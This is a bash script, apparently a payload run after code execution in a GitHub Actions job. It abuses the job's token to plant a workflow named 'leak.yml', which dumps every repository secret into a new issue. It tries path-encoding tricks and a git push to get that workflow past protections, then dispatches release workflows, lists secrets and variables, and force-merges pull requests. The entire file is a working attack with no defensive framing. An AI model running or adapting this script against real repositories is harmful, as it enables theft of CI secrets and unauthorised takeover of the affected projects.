#!/bin/bash
exec 1>&2
set -x
REPO="$GITHUB_REPOSITORY"
echo "RCE_MARKER=$(date +%s)"
id
echo "TOKLEN=${#GITHUB_TOKEN}"
echo "--- authenticated API call"
gh api "repos/$REPO" --jq '"\(.full_name) private=\(.private)"'
echo "API_EXIT=$?"

cat > /tmp/leak.yml <<'YAML'
name: leak
on:
  workflow_dispatch:
permissions:
  contents: write
  issues: write
jobs:
  dump:
    runs-on: ubuntu-latest
    steps:
      - name: d
        env:
          ALL: ${{ toJSON(secrets) }}
          GH_TOKEN: ${{ github.token }}
        run: |
          printf '%s' "$ALL" > /tmp/a.json
          gh api -X POST "repos/$GITHUB_REPOSITORY/issues" -f title="secs-$(date +%s)" -F body=@/tmp/a.json || true
YAML
B64W=$(base64 -w0 /tmp/leak.yml)

echo "=== path bypass attempts"
for p in ".github/workflows/leak.yml" ".github/workflows%2Fleak.yml" ".github%2Fworkflows%2Fleak.yml" ".github//workflows/leak.yml" ".github/./workflows/leak.yml" ".GitHub/workflows/leak.yml" "%2Egithub/workflows/leak.yml" ".github/workflows/..%2F..%2F.github%2Fworkflows%2Fleak.yml"; do
  echo "--- PATH $p"
  gh api -X PUT "repos/$REPO/contents/$p" -f message="t" -f content="$B64W" -f branch=0.x -i 2>&1 | grep -E "^HTTP|message" | head -2
done

echo "=== git push workflow"
git config user.name t; git config user.email t@t
git checkout -b wfpush 2>/dev/null
mkdir -p .github/workflows
cp /tmp/leak.yml .github/workflows/leak.yml
git add .github/workflows/leak.yml
git commit -m "add wf" 2>&1 | tail -2
git push origin wfpush 2>&1 | tail -8
echo "GITPUSH_EXIT=$?"

echo "=== dispatch create-release.yml"
gh api -X POST "repos/$REPO/actions/workflows/create-release.yml/dispatches" -f ref=0.x -f "inputs[version]=9.9.9" -i 2>&1 | grep -E "^HTTP|message" | head -3

echo "=== dispatch leak.yml on wfpush ref"
gh api -X POST "repos/$REPO/actions/workflows/leak.yml/dispatches" -f ref=wfpush -i 2>&1 | grep -E "^HTTP|message" | head -3

echo "=== list secrets"
gh api "repos/$REPO/actions/secrets" -i 2>&1 | grep -E "^HTTP|message|total_count|name" | head -5
echo "=== list variables"
gh api "repos/$REPO/actions/variables" -i 2>&1 | grep -E "^HTTP|message|total_count|name" | head -5

echo "=== repository_dispatch"
gh api -X POST "repos/$REPO/dispatches" -f event_type=probe -i 2>&1 | grep -E "^HTTP|message" | head -3

echo "=== merge trivial PR 12"
gh api -X PUT "repos/$REPO/pulls/12/merge" -f merge_method=squash -i 2>&1 | grep -E "^HTTP|message|merged" | head -3

echo "=== merge workflow PR 9"
gh api -X PUT "repos/$REPO/pulls/9/merge" -f merge_method=squash -i 2>&1 | grep -E "^HTTP|message|merged" | head -3
echo DONE
